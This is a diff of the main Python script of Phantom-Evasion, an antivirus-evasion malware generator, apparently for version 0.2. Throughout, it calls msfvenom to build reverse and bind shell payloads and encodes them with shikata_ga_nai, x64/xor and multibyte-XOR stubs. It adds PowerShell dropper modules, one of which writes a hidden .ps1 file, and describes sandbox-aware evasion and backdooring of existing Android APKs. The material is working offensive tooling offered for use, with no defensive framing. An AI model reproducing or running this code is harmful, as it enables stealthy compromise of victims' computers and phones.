@@ -32,12 +32,20 @@ sys.dont_write_bytecode = True
 class bcolors:
     PURPLE = '\033[95m'
     BLUE = '\033[94m'
+    DARKCYAN = '\033[36m'
     GREEN = '\033[92m'
     OCRA = '\033[93m'
     RED = '\033[91m'
     ENDC = '\033[0m'
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
+
+def python_banner():
+    clear()
+    py_version=platform.python_version()
+    print(bcolors.OCRA + bcolors.BOLD + "\n[>] Python Version: " + bcolors.ENDC + bcolors.ENDC + py_version)
+    sleep(0.5)
+
 
 def path_finder(filename):
     path = ""
@@ -81,9 +89,9 @@ def kali_arch_isready():
     print(bcolors.OCRA + "[>] Checking dependencies:\n" + bcolors.ENDC)
     package = os.system("dpkg -l | grep libc6-dev-i386 >/dev/null 2>&1")
     if package == 0:
-        print(bcolors.GREEN + "[>] Package libc6-dev-i386 [Found]\n" + bcolors.ENDC)
+        print(bcolors.GREEN + "[>] Package libc6-dev-i386               [Found]\n" + bcolors.ENDC)
     else:
-        print(bcolors.RED + "[>] Package libc6-dev-i386 [Not Found]\n" + bcolors.ENDC)
+        print(bcolors.RED + "[>] Package libc6-dev-i386                 [Not Found]\n" + bcolors.ENDC)
         sleep(1)
         print(bcolors.GREEN + "[>] Trying to autoinstall:\n" + bcolors.ENDC)
         sleep(1)
@@ -125,6 +133,7 @@ def ubuntu_isready():
 
 def auto_setup(name):
     name2=name
+    numspace = " " * (35 - len(name))
     if "mingw-w64" in name:
 
         name2="i686-w64-mingw32-gcc"
@@ -134,13 +143,13 @@ def auto_setup(name):
 
 
     except subprocess.CalledProcessError: 
-        print(bcolors.RED + "[-] " + name + "  [Not Found]\n" + bcolors.ENDC)
+        print(bcolors.RED + "[-] " + name + numspace + "  [Not Found]\n" + bcolors.ENDC)
         sleep(0.2)
         print(bcolors.GREEN + "[>] Trying to autoinstall\n" + bcolors.ENDC)
         sleep(1)
         subprocess.call(['apt-get','install',name,'-y'])
     else:
-        print(bcolors.GREEN + "[+] " + name + "  [Found]" + bcolors.ENDC) 
+        print(bcolors.GREEN + "[+] " + name + numspace + "  [Found]" + bcolors.ENDC) 
         sleep(0.1)
 
 def auto_check(name):
@@ -161,42 +170,41 @@ def auto_check(name):
         sleep(0.1)
 
 def dependencies_checker():
-    clear()
     platform_used=""
     platform_used=platform.system()
     release_used=""
     release_used=platform.platform()
-    
+                          
     if platform_used == "Linux":
 
         if "kali" in release_used:
 
             if "rolling" in release_used:
 
-                print(bcolors.OCRA + "\n[>] KALI-ROLLING Detected!!\n" + bcolors.ENDC)
+                print(bcolors.OCRA + bcolors.BOLD + "\n[>] Kali-Rolling Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
                 sleep(1)
 
             elif "rolling" not in release_used:
 
-                print(bcolors.OCRA + "\n[>] KALI2 Detected!!\n" + bcolors.ENDC)
+                print(bcolors.OCRA + bcolors.BOLD + "\n[>] Kali 2 Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
                 sleep(1)
 
             kali_arch_isready()
 
         elif "Ubuntu" in release_used:                
                 
-            print(bcolors.OCRA + "\n[>] UBUNTU Detected!!\n" + bcolors.ENDC)
+            print(bcolors.OCRA + bcolors.BOLD + "\n[>] Ubuntu Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
             sleep(1)
             ubuntu_isready()
 
         else:
-            print(bcolors.OCRA + "\n[>] LINUX distro Detected!! \n" + bcolors.ENDC)
+            print(bcolors.OCRA + bcolors.BOLD + "\n[>] Linux distro Detected!! \n" + bcolors.ENDC + bcolors.ENDC)
             sleep(1)
             linux_isready()
 
     elif platform_used == "Windows":
 
-        print(bcolors.RED + "\n[>] WINDOWS Detected!!\n" + bcolors.ENDC)
+        print(bcolors.RED + bcolors.BOLD + "\n[>] Windows Detected!!\n" + bcolors.ENDC + bcolors.ENDC)
         sleep(1)
         print("[-] Auto install not supported\n")
         sleep(0.2)
@@ -218,14 +226,14 @@ def advisor():
     sleep(0.2)
     print(bcolors.RED + "[+] GITHUB: " + bcolors.ENDC + "https://github.com/oddcod3 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.1 \n")
+    print(bcolors.RED + "[+] VERSION: " + bcolors.ENDC + "0.2 \n")
     sleep(0.2)
-    print(bcolors.RED + "[+] NOTE: " + bcolors.ENDC + "Please Avoid submitting to VirusTotal!! (use NoDistribute instead)\n")
+    print(bcolors.RED + "[+] MODULES: " + bcolors.ENDC + "12\n")
     sleep(0.2)
-    print(bcolors.RED + "[+] NOTE: " + bcolors.ENDC + "If generated file get caught try to run again the module \n")
+    print(bcolors.RED + "[+] NEW FEATURES: " + bcolors.ENDC + "Powershell payload & custom encoder \n")
   
 
-    sleep(5)
+    sleep(3)
     
 
 def clear():
@@ -234,14 +242,16 @@ def clear():
 
 def banner():
     bann= "\n\n"
-    bann += "   __________  ___ ___    _____    _________________________      _____   \n" 
-    bann += "   \______   \/   |   \  /  _  \   \      \__    ___|_____  \    /     \  \n"
-    bann += "    |     ___/    ~    \/  /_\  \  /   |   \|    |   /   |   \  /  \ /  \ \n"
-    bann += "    |    |   \    Y    /    |    \/    |    \    |  /    |    \/    Y    \\\n"
-    bann += "    |____|    \___|_  /\____|__  /\____|__  /____|  \_______  /\____|__  /\n"
-    bann += "                    \/         \/         \/                \/         \/ \n"
+    bann += "                       _                 _                        \n" 
+    bann += "                 _ __ | |__   __ _ _ __ | |_ ___  _ __ ___        \n"
+    bann += "                | '_ \| '_ \ / _` | '_ \| __/ _ \| '_ ` _ \       \n"
+    bann += "                | |_) | | | | (_| | | | | || (_) | | | | | |      \n"
+    bann += "                | .__/|_| |_|\__,_|_| |_|\__\___/|_| |_| |_|      \n"
+    bann += "                |_|   / _ \ \ / / _` / __| |/ _ \| '_ \           \n"
+    bann += "                     |  __/\ V / (_| \__ \ | (_) | | | |          \n"
+    bann += "                      \___| \_/ \__,_|___/_|\___/|_| |_|          \n"
     sleep(0.3)
-    print(bcolors.RED + bann  + bcolors.ENDC)
+    print(bcolors.RED + bcolors.BOLD + bann  + bcolors.ENDC + bcolors.ENDC)
   
 def exit_banner():
 
@@ -377,7 +387,7 @@ def auto_pyinstall(filename):
 
 def menu_options():
     print("    ====================================================================")
-    print("  ||"+ bcolors.OCRA + "     [PHANTOM MENU]" + bcolors.ENDC + ":             ||                                 || ")
+    print("  ||"+ bcolors.OCRA + "        [MAIN MENU]" + bcolors.ENDC + ":             ||                                 || ")
     print("  ||                                 ||                                 || ")
     print("  ||    [1]  List All modules        ||   [5]  List Android modules     || ")
     print("  ||                                 ||                                 || ")
@@ -389,10 +399,10 @@ def menu_options():
     print("  ||                                 ||                                 || ")
     print("    ====================================================================\n")
 
-def payload_generator(msfvenom_payload,arch,host,port):
+def payload_generator(msfvenom_payload,arch,host,port,payload_format):
     py_version=platform.python_version()    
 
-    Randiter = str(random.randint(10,15))
+    Randiter = str(random.randint(1,5))
     platform == ""
  
 
@@ -400,37 +410,68 @@ def payload_generator(msfvenom_payload,arch,host,port):
 
         Lhost= "LHOST=" + str(host)
         Lport= "LPORT=" + str(port)
-        if platform.system() == "Windows":
-            if py_version[0] == "3":
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
-            else:
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
-
-
-            
-        else:
-
-            if py_version[0] == "3":
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-            else:
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
-
 
     elif "bind" in msfvenom_payload: 
 
         Rhost= "RHOST=" + str(host)
         Rport= "RPORT=" + str(port)
-        if platform.system() == "Windows":
-            if py_version[0] == "3":
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
-            else:
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+
+
+    if platform.system() == "Windows":
+        if py_version[0] == "3":
+            if payload_format == "c":
+                if arch == "x86":
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                if arch == "x64":
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+            if payload_format == "psh":
+
+                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'],shell=True, stdout=subprocess.PIPE).stdout.decode('utf-8')
+        else:
+
+            if payload_format == "c":
+                if arch == "x86":
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+
+                if arch == "x64":
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'],shell=True)
+
+
+            if payload_format == "psh":
+                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'],shell=True)
+
+        
+    else:
+
+        if py_version[0] == "3":
+
+            if payload_format == "c":
+                if arch == "x86":
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+                if arch == "x64":
+                    Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
+
+            if payload_format == "psh":
+
+                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,host,port,'-a',arch,'-f','psh'], stdout=subprocess.PIPE).stdout.decode('utf-8')
 
         else:
-            if py_version[0] == "3":
-                Payload = subprocess.run(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'], stdout=subprocess.PIPE).stdout.decode('utf-8')
-            else:
-                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Rhost,Rport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+
+            if payload_format == "c":
+                if arch == "x86":
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x86/shikata_ga_nai','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+
+                if arch == "x64":
+                    Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'--smallest','-e','x64/xor','-i',Randiter,'-b','\'\\x00\\x0a\\x0d\'','-f','c'])
+
+            if payload_format == "psh":
+
+                Payload = subprocess.check_output(['msfvenom','-p',msfvenom_payload,Lhost,Lport,'-a',arch,'-f','psh'])
+
+
 
     return str(Payload)
 
@@ -458,11 +499,11 @@ def auto_compiler(module_type,arch,filename):
 
         elif "linux" in module_type and arch == "x86":
 
-            subprocess.call(['gcc','Source.c','-o',filename,'-m32','-static'])
+            subprocess.call(['gcc','Source.c','-lm','-o',filename,'-m32','-static'])
 
         elif "linux" in module_type and arch == "x64":
 
-            subprocess.call(['gcc','Source.c','-o',filename,'-static'])
+            subprocess.call(['gcc','Source.c','-lm','-o',filename,'-static'])
 
     elif Os_used == "Windows":
 
@@ -525,10 +566,28 @@ def module_launcher1(module_choice):
     if "x64" in payload_choice:
 
         Arc = "x64"
+        print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+        sleep(0.2)
+        print("[1] x64/xor (good)\n")
+        print("[2] x64/xor + Multibyte xor c stub (excellent)\n")
+
 
     else:
 
+
         Arc = "x86"
+        print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+        sleep(0.2)
+        print("[1] x86/shikata_ga_nai (good)\n")
+        print("[2] x86/shikata_ga_nai + Multibyte xor c stub (excellent)\n")
+
+    if py_version[0] == "3":
+
+        enc_type = input("\n[>] Please enter options number: ")
+    else:
+        enc_type = raw_input("\n[>] Please enter options number: ")        
+
+
     if py_version[0] == "3":
 
         output_filename = input("\n[>] Enter output filename: ")
@@ -539,15 +598,19 @@ def module_launcher1(module_choice):
 
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC) 
 
-    Payload = payload_generator(payload_choice,Arc,commtype,port)
+    Payload = payload_generator(payload_choice,Arc,commtype,port,"c")
+
+    if enc_type == "2":
+        print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5) 
 
     if platform.system() == "Linux":
 
-        subprocess.call(['python',module_where,Payload,output_filename])
+        subprocess.call(['python',module_where,Payload,output_filename,enc_type])
 
     elif platform.system() == "Windows":
         
-        subprocess.call(['py',module_where,Payload,output_filename])
+        subprocess.call(['py',module_where,Payload,output_filename,enc_type])
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
 
@@ -570,9 +633,24 @@ def module_launcher2(module_choice):
 
     Payload = custom_payload_completer(custom_shellcode)
 
+    print(bcolors.OCRA + "\n[>] Encoding step:\n" + bcolors.ENDC)
+    sleep(0.2)
+    print("[1] None\n")
+    print("[2] MultibyteKey xor c stub (excellent)\n")
+
+    if py_version[0] == "3":
+
+        enc_type = input("\n[>] Please enter options number: ")
+    else:
+        enc_type = raw_input("\n[>] Please enter options number: ")        
+
     print(bcolors.GREEN + "\n[>] Generating code...\n" + bcolors.ENDC)
 
-    subprocess.call(['python',module_choice,Payload,output_filename])
+    subprocess.call(['python',module_choice,Payload,output_filename,enc_type])
+
+    if enc_type == "2":
+        print(bcolors.GREEN + "\n[>] Xor multibyte encoding...\n" + bcolors.ENDC)
+        sleep(0.5)     
 
     print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
 
@@ -599,6 +677,153 @@ def shellcode_completer(module_type):
         print("\n[<>] File saved in Phantom-Evasion folder!\n")
         sleep(3)
 
+
+def powershell_options(module_type):
+    clear()
+    py_version=platform.python_version()
+    if module_type == "1":
+        print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
+        print("[1] Msfvenom powershell payload\n")
+        print("[2] Custom powershell file\n")
+
+    if module_type == "2":
+        print(bcolors.OCRA + "[<Payload>] choose how to supply powershell payload:\n\n" + bcolors.ENDC)
+        print("[1] Custom powershell Oneline  (Empire-like) \n")
+    if py_version[0] == "3":
+        ans=input("\n[>] Please insert choice\'s number: ")
+    else:
+        ans=raw_input("\n[>] Please insert choice\'s number: ")        
+    return ans
+
+def powershell_completer(module_type):
+
+    if module_type == "Polymorphic_PowershellScriptDropper_windows.py":
+
+        powershell_type = powershell_options("1")
+
+        if powershell_type == "1":
+
+            powershell_launcher1(module_type)
+            print("\n[<>] File saved in Phantom-Evasion folder!\n")
+            sleep(3)
+
+        elif powershell_type == "2":
+
+            powershell_launcher2(module_type)
+            print("\n[<>] File saved in Phantom-Evasion folder!\n")
+            sleep(3)
+
+    if module_type == "Polymorphic_PowershellOnelineDropper_windows.py":
+
+        powershell_type = powershell_options("2")
+
+        if powershell_type == "1":
+            powershell_launcher2(module_type)    
+            print("\n[<>] File saved in Phantom-Evasion folder!\n")
+            sleep(3)
+    
+            
+def powershell_launcher1(module_choice):
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        payload_choice=input(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
+    else:
+        payload_choice=raw_input(bcolors.OCRA + "\n[>] Please enter msfvenom powershell payload:" + bcolors.ENDC)
+        
+    if "reverse" in payload_choice:
+        if py_version[0] == "3":
+            commtype=input("\n[>] Please insert LHOST: ")
+            port=input("\n[>] Please insert LPORT: ")
+        else:
+            commtype=raw_input("\n[>] Please insert LHOST: ")
+            port=raw_input("\n[>] Please insert LPORT: ")
+
+    elif "bind" in payload_choice:
+
+        if py_version[0] == "3":
+            commtype=input("\n[>] Please insert RHOST: ")
+            port=input("\n[>] Please insert RPORT: ")
+        else:
+            commtype=raw_input("\n[>] Please insert RHOST: ")
+            port=raw_input("\n[>] Please insert RPORT: ")
+
+    if "x64" in payload_choice:
+
+        Arc = "x64"
+
+    else:
+
+        Arc = "x86"
+
+
+    if py_version[0] == "3":
+
+        output_filename = input("\n[>] Enter output filename: ")
+    else:
+        output_filename = raw_input("\n[>] Enter output filename: ")        
+
+    module_where = "Modules/payloads/" + module_choice
+
+    print(bcolors.GREEN + "\n[>] Generating powershell payload...\n" + bcolors.ENDC) 
+
+    Payload = payload_generator(payload_choice,Arc,commtype,port,"psh")
+
+    print(bcolors.GREEN + "\n[>] Generating powershell dropper...\n" + bcolors.ENDC) 
+
+    if platform.system() == "Linux":
+
+        subprocess.call(['python',module_where,Payload,output_filename])
+
+    elif platform.system() == "Windows":
+        
+        subprocess.call(['py',module_where,Payload,output_filename])
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC) 
+
+    sleep(2)
+
+    auto_compiler(module_choice,Arc,output_filename)
+
+def powershell_launcher2(module_choice):
+    py_version=platform.python_version()
+    if py_version[0] == "3":
+        if module_choice == "Polymorphic_PowershellScriptDropper_windows.py":
+            powershell_payload = ""
+            path2psfile = input("\n[>] Please enter the path of the powershell script: ")
+            powershellfile = open(path2psfile, "r")
+            for line in powershellfile:
+                powershell_payload += line
+    
+        if module_choice == "Polymorphic_PowershellOnelineDropper_windows.py":
+            powershell_payload = input("\n[>] Please enter powershell oneline payload: ")
+        output_filename = input("\n[>] Enter output filename: ")
+        arch = input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+    else:
+        if module_choice == "Polymorphic_PowershellScriptDropper_windows.py":
+            powershell_payload = ""
+            path2psfile = raw_input("\n[>] Please enter the path of the powershell script: ")
+            powershellfile = open(path2psfile, "r")
+            for line in powershellfile:
+                powershell_payload += line
+    
+
+        if module_choice == "Polymorphic_PowershellOnelineDropper_windows.py":
+            powershell_payload = raw_input("\n[>] Please enter powershell oneline payload: ")
+        output_filename = raw_input("\n[>] Enter output filename: ")
+        arch = raw_input("\n[>] Enter resulting arch format  (x86 or x64)  : ")
+
+    module_choice = "Modules/payloads/" + module_choice
+
+    print(bcolors.GREEN + "\n[>] Generating powershell dropper...\n" + bcolors.ENDC)
+
+    subprocess.call(['python',module_choice,powershell_payload,output_filename])
+
+    print(bcolors.GREEN + "\n[>] Compiling...\n" + bcolors.ENDC)
+
+    sleep(2)
+
+    auto_compiler(module_choice,arch,output_filename)
+    
 def osx_cascade_encoding():
     py_version=platform.python_version()
     if py_version[0] == "3":     
@@ -774,8 +999,9 @@ def pem_pk8():
        os.remove("Setup/apk_sign/key.pem")
 
 def droidmare_launcher():
-    print("\n[1] Obfuscate msf payload\n")
-    print("\n[2] Obfuscate msf payload & Backdoor Apk \n")
+    print(bcolors.OCRA + "\n[>] MODE:" + bcolors.ENDC)
+    print("\n[1] Obfuscate msf payload")
+    print("\n[2] Obfuscate msf payload & Backdoor existing Apk \n")
     py_version=platform.python_version()
     if py_version[0] == "3":
         decision =input(bcolors.OCRA + "\n[>] Choose options number:" + bcolors.ENDC)
@@ -809,9 +1035,9 @@ def droidmare_launcher():
         apk_msfvenom()
         sleep(0.5)
         if py_version[0] == "3":
-            apktobackdoor=input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom folder then enter the name:" + bcolors.ENDC)
+            apktobackdoor=input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC)
         else:
-            apktobackdoor=raw_input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom folder then enter the name:" + bcolors.ENDC)          
+            apktobackdoor=raw_input(bcolors.OCRA + "\n[>] Copy the apk to backdoor in Phantom-Evasion folder then enter the name:" + bcolors.ENDC)          
         if ".apk" not in apktobackdoor:
             apktobackdoor += ".apk"
         apktool_d("msf_gen.apk","msf_smali")
@@ -847,15 +1073,15 @@ def description_printer(module_type):
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + multibyte-key xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  What is my name technique \n"
-        description += "  Big memory alloc technique\n"
-        description += "  Random millions increments \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"
 
     elif module_type == "MHA_mathinject_windows.py":
@@ -865,48 +1091,76 @@ def description_printer(module_type):
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + multibyte-key xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  What is my name technique \n"
-        description += "  Big memory alloc techinque\n"
-        description += "  Random millions increments \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file \n"
 
     elif module_type == "Polymorphic_MVA_mathinject_windows.py":
         description = ""
-        description += "  This Module use static multipath technique to forge\n"
+        description += "  This Module use polymorphic multipath technique to forge\n"
         description += "  Windows dropper written in c able to avoid \n"
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: VIRTUAL\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + multibyte-key xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Polymorphic Multipath Technique  \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
 
     elif module_type == "Polymorphic_MHA_mathinject_windows.py":
         description = ""
-        description += "  This Module use static multipath technique to forge\n"
+        description += "  This Module use polymorphic multipath technique to forge\n"
         description += "  Windows dropper written in c able to avoid \n"
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + multibyte-key xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Polymorphic Multipath Technique  \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "Polymorphic_PowershellOnelineDropper_windows.py":
+        description = ""
+        description += "  This Module use polymorphic multipath technique to forge\n"
+        description += "  Windows powershell dropper written in c able to avoid \n"
+        description += "  payload's execution inside AVs sandbox \n\n"
+        description += "  [>] METHOD: system() call\n"
+        description += "  [>] Payload type: Oneliner powershell payload\n\n"
+        description += "  [>] Require powershell installed (target-side) \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+
+    elif module_type == "Polymorphic_PowershellScriptDropper_windows.py":
+        description = ""
+        description += "  This Module use polymorphic multipath technique to forge\n"
+        description += "  Windows powershell script dropper written in c able to avoid \n"
+        description += "  payload's execution inside AVs sandbox \n\n"
+        description += "  [>] METHOD: create hidden .ps1 file & system() call\n"
+        description += "  [>] Payload type: Powershell Script payload\n\n"
+        description += "  [>] Require powershell installed (target-side) \n"
+        description += "  [>] AUTOCOMPILE(cross platform): to EXE file\n"
+        description += "  [>] WARNING: 32 bit msfvenom powershell payloads will not\n"
+        description += "  work against 64 bit targets (like other modules) be sure to use\n"
+        description += "  64 bit payloads in that case\n"
+
 
     elif module_type == "MHA_mathinject_linux.py":
         description = ""
@@ -915,31 +1169,31 @@ def description_printer(module_type):
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x86/shikata_ga_nai\n"
+        description += "  [2] x86/shikata_ga_nai + multibyte-key xor c stub \n"
+        description += "  32bit ENCODER avaiable: \n"
+        description += "  [1] x64/xor\n"
+        description += "  [2] x64/xor + multibyte-key xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  What is my name technique \n"
-        description += "  Big memory alloc techinque\n"
-        description += "  Random millions increments \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"
 
     elif module_type == "Polymorphic_MHA_mathinject_linux.py":
         description = ""
-        description += "  This Module use static multipath technique to forge\n"
+        description += "  This Module use polymorphic multipath technique to forge\n"
         description += "  Linux dropper written in c able to avoid \n"
         description += "  payload's execution inside most AV sandbox \n\n"
         description += "  [>] Memory allocation type: HEAP\n\n"
         description += "  [>] STATIC EVASION:\n"
-        description += "  if you choose to supply payload via msfvenom \n"
-        description += "  than it will be autoencoded with shikata_ga_nai\n"
-        description += "  Note that if you want to supply custom shellcode you'll need\n"
-        description += "  to evade static analysis if necessary\n\n"
+        description += "  ENCODER avaiable: \n"
+        description += "  [1] Shikata_ga_nai (good) \n"
+        description += "  [2] Shikata_ga_nai + Multibyte xor c stub \n"
         description += "  [>] DYNAMIC EVASION:\n"
-        description += "  Polymorphic Multipath Technique  \n"
-        description += "  Random math subprogram if sandobox detected\n"
+        description += "  What is my name technique \n"
+        description += "  Resource consumption technique\n"
+        description += "  Sandbox-aware code \n"
         description += "  [>] AUTOCOMPILE(cross platform): to ELF file \n"
 
     elif module_type == "Pytherpreter":
@@ -999,7 +1253,7 @@ def description_printer(module_type):
         description += "  [>] OUTFORMAT: Apk \n"
 
     else: 
-        description = "NOnEEEE"
+        description = "None"
     print(description)
     try:   
         ans=input("  Press Enter to continue: ") 
